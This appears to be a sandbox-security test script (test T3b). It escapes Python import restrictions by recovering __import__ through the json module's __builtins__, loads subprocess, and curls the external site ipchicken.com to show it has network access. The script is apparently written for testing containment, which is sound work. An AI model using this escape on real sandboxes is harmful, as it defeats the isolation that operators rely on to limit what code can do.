"""T3b (optional): escape via json builtins and curl https://ipchicken.com."""

import json

URL = "https://ipchicken.com"


def run():
    real_builtins = json.__dict__["__builtins__"]
    if not isinstance(real_builtins, dict):
        real_builtins = real_builtins.__dict__

    subprocess = real_builtins["__import__"]("subprocess")
    completed = subprocess.run(
        ["curl", "-sS", "-L", "--max-time", "15", "-A", "rtc358-benign-sandbox-test/1.0", "-o", "-", "-w", "\nHTTP_STATUS:%{http_code}", URL],
        capture_output=True,
        text=True,
    )
    stdout = completed.stdout or ""
    # Keep evidence small.
    prefix = stdout[:200]
    status_marker = ""
    if "HTTP_STATUS:" in stdout:
        status_marker = stdout.rsplit("HTTP_STATUS:", 1)[-1].strip()

    return {
        "ok": completed.returncode == 0,
        "test_id": "T3b",
        "url": URL,
        "returncode": completed.returncode,
        "http_status": status_marker,
        "stdout_prefix": prefix,
        "stderr_prefix": (completed.stderr or "")[:200],
    }
